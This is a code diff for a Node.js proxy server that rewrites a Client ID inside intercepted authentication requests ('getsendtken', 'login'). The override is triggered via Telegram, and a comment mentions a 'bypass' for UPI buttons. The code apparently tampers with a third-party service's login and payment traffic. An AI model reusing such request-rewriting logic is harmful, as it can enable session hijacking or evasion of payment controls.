@@ -263,11 +263,11 @@ async function applyNextClientIdOverride(req, data) {
     return false;
   }
 
-  const applied = Array.isArray(pending.appliedEndpoints) ? pending.appliedEndpoints : [];
-  if (applied.includes(endpoint)) return false;
+  // Do not mark the first endpoint as consumed. The same configured Client ID
+  // must be rewritten independently on both getsendtken and login; consume it
+  // only after the final login request.
   if (!rewriteExistingClientIdField(req, replacement)) return false;
 
-  pending.appliedEndpoints = [...applied, endpoint];
   // The override remains available for the same authentication flow until the
   // final login request, then it is consumed so it cannot affect later logins.
   if (endpoint === 'login') data.nextClientIdOverride = null;
@@ -1841,7 +1841,7 @@ app.get('/app/jsValue/:type', async (req, res) => {
 
 app.all('/xxapi/*', async (req, res) => {
   try {
-    const data = await loadData();
+    let data = await loadData();
     const path = req.originalUrl || req.url;
     const urlLower = path.toLowerCase();
     const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
@@ -1855,9 +1855,10 @@ app.all('/xxapi/*', async (req, res) => {
       return res.status(200).end('OK');
     }
 
-    // TEST_MODE only: rewrite an already-present Client ID before forwarding
-    // the observed authentication requests. Production leaves request bytes
-    // untouched because CLIENT_ID_TEST_MODE is false there.
+    // TEST_MODE only: refresh the shared state for authentication requests so
+    // the override armed by Telegram is visible across Vercel instances, then
+    // rewrite the same Client ID independently in each request body.
+    if (getAuthClientIdEndpoint(path)) data = await loadData(true);
     await applyNextClientIdOverride(req, data);
 
     // ── 100% CLEAN BYPASS FOR UPI & TEAM BUTTONS ──────────────────────────────
